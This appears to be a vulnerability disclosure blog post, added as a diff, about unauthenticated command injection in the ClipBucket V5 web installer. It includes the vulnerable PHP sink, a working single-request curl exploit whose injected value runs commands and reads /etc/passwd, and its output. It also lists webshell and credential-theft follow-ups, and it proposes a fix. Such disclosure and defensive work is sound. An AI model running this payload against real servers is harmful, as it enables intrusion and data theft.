@@ -1,0 +1,157 @@
+---
+title: 'ClipBucket V5: Unauthenticated RCE via Web Installer Command Injection'
+date: '2026-09-03'
+tags: ['Vulnerability Research', 'Web Security', 'Penetration Testing', 'RCE', 'Command Injection']
+description: 'How I discovered a critical unauthenticated remote code execution vulnerability in ClipBucket V5 web installer that allows complete server compromise with a single HTTP request.'
+---
+
+# ClipBucket V5: Unauthenticated RCE via Web Installer Command Injection
+
+## Introduction
+
+During security research on ClipBucket V5, an open-source video sharing platform, I discovered a critical command injection vulnerability in the web installer that allows **unauthenticated remote code execution** with a single HTTP request. No credentials, no session, no prior interaction required - just one POST request for complete server compromise.
+
+**Severity:** Critical (CVSS 9.8)  
+**Affected Versions:** ClipBucket V5 <= 5.5.3  
+**CWE:** CWE-78 (OS Command Injection), CWE-306 (Missing Authentication for Critical Function)
+
+## The Vulnerability
+
+The web installer's "precheck" step accepts a `php_cli_filepath` POST parameter intended to let administrators specify a custom PHP CLI binary path. This value is concatenated directly into a shell command with **no escaping** and **no validation**.
+
+The vulnerable sink in `upload/includes/classes/system.class.php`:
+
+```php
+public static function get_php_cli_info($php_path = null): array
+{
+    if( empty($php_path) ) {
+        $php_path = self::get_binaries('php', false);
+    }
+    if( !self::check_php_function('exec', 'web', false) ){
+        return [];
+    }
+    $complement = '';
+    if( THIS_PAGE == 'cb_install' ){
+        $complement = ' install';
+    }
+    $cmd = $php_path . ' ' . DirPath::get('admin_actions') . 'phpinfo.php' . $complement;
+
+    exec($cmd, $php_cli_info);
+    ...
+}
+```
+
+The `$php_path` parameter flows directly into `exec()` with no `escapeshellarg()` or `escapeshellcmd()`. For comparison, other binary paths in the same codebase (`mysql_client`, `ffmpeg`, `ffprobe`, etc.) all validate with `file_exists()` before use - the `php_cli` branch is the only one missing this check.
+
+## Attack Chain
+
+The full call chain from HTTP request to code execution:
+
+1. **Entry point:** `cb_install/index.php` accepts `$mode = $_POST['mode']` with no authentication
+2. **Weak gate:** The only protection is checking if `files/temp/install.me` exists - this file ships with the repo and is only deleted after installation completes
+3. **Tainted input:** `precheck.php` passes `$_POST['php_cli_filepath']` directly to `System::get_software_version()`
+4. **Sink:** The value reaches `exec()` without any sanitization
+
+The installer's access gate is particularly weak:
+
+```php
+if (!file_exists(DirPath::get('temp') . 'install.me')) {
+    if (!file_exists(DirPath::get('temp') . 'install.me.not') && 
+        !file_exists(DirPath::get('temp') . 'development.dev')) {
+        header('Location: //' . $_SERVER['SERVER_NAME']);
+        die();
+    }
+}
+```
+
+The redirect only fires when **all three** marker files are absent. Since `install.me` ships present by default, the installer is accessible throughout the entire setup window.
+
+## Proof of Concept
+
+Tested against a fresh deployment using the official Docker image at commit `da1a665be9499ed68ce8ef94ff6af560aca272ff`:
+
+```bash
+curl -s -o /dev/null -w "HTTP %{http_code}\n" \
+  -X POST "http://<target>/cb_install/index.php" \
+  --data-urlencode "mode=precheck" \
+  --data-urlencode "php_cli_filepath=id > /srv/http/clipbucket/upload/files/temp/rce_out.txt; hostname >> /srv/http/clipbucket/upload/files/temp/rce_out.txt; cat /etc/passwd | head -3 >> /srv/http/clipbucket/upload/files/temp/rce_out.txt;#"
+```
+
+No cookies. No session. No prior requests. This single POST is the entire attack.
+
+The trailing `;#` terminates the injected command and comments out the rest of the concatenated string (the `phpinfo.php` path suffix).
+
+**Result** - `upload/files/temp/rce_out.txt` contained:
+
+```
+uid=1000(containeruser) gid=1000(containeruser) groups=1000(containeruser)
+43f676f93eb6
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+```
+
+Full arbitrary command execution as the web server user.
+
+## Why This Matters
+
+You might ask: if `install.me` is present, couldn't an attacker just complete the installer and create an admin account?
+
+Key differences:
+
+1. **No database required:** The precheck step (step 2) runs before database configuration (step 5). This vulnerability requires zero knowledge of database credentials.
+
+2. **No multi-step wizard:** Finishing installation requires navigating 8 steps with valid inputs. This is one request.
+
+3. **Admin != RCE:** The previously-patched admin RCE (`update_launch.php`, GHSA-3x4g-x3gv-rjmq) is fixed in current versions. There's no plugin upload feature. Becoming Administrator does not currently grant code execution - this bug does.
+
+## Real-World Exposure
+
+This isn't a theoretical edge case:
+
+- The official Docker image and fresh `git clone` both leave `install.me` present by default
+- ClipBucket's own application logic **actively redirects** unauthenticated visitors to `/cb_install` when `install.me` exists
+- Installer directories are commonly left in place on shared hosting, staging environments, and forgotten demo instances
+
+The application itself funnels drive-by traffic toward the vulnerable endpoint.
+
+## Impact
+
+Complete unauthenticated remote code execution as the web server user:
+
+- Drop webshells into the web root
+- Read `includes/config.php` for database credentials and secrets
+- Interfere with in-progress installations to plant backdoor admin accounts
+- Pivot further depending on host/container configuration
+
+## Suggested Fix
+
+Add `file_exists()` validation and proper escaping:
+
+```php
+public static function get_php_cli_info($php_path = null): array
+{
+    if( empty($php_path) ) {
+        $php_path = self::get_binaries('php', false);
+    }
+    if( !file_exists($php_path) ){
+        return ['err' => 'Unable to find PHP CLI'];
+    }
+    // ... rest of function
+    exec(escapeshellarg($php_path) . ' ' . escapeshellarg($script_path), $php_cli_info);
+}
+```
+
+Broader recommendation: apply `escapeshellarg()` consistently across all `exec()`/`shell_exec()` calls that incorporate user-supplied paths.
+
+## Timeline
+
+- **2026-08-06:** Vulnerability discovered during security research
+- **2026-08-XX:** Reported to ClipBucket maintainers via GitHub Security Advisory
+- **2026-XX-XX:** Fix released (pending)
+
+## Conclusion
+
+This vulnerability demonstrates how a single missing validation check in an installer component can lead to complete server compromise. The combination of no authentication, direct command injection, and the application actively routing traffic to the vulnerable endpoint creates a perfect storm for exploitation.
+
+Always remember to remove or secure installer directories after deployment - and if you're a developer, treat any user-controllable value that reaches `exec()` as a loaded weapon.
